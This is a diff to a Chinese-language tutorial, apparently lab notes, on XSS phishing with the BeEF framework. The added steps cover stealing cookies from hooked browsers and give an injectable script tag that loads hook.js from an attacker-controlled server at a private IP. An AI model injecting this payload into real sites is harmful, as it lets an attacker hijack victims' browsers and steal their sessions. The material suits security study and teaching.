@@ -39,3 +39,14 @@ http://172.16.120.177:3000/clone_taobao
 ![image](https://github.com/498946975/Security/blob/master/images/xss_23.png)
 然后在beef上，就可以收到上线可控的浏览器
 ![image](https://github.com/498946975/Security/blob/master/images/xss_24.png)
+
+### 6、使用beef控制
+获取钓鱼的cookie
+![image](https://github.com/498946975/Security/blob/master/images/xss_25.png)
+
+### 7、发送钓鱼脚本，进行控制
+[13:05:29]    |   Hook URL: http://172.16.120.177:3000/hook.js
+```shell script
+<script src="http://172.16.120.177:3000/hook.js"></script>
+```
+![image](https://github.com/498946975/Security/blob/master/images/xss_26.png)
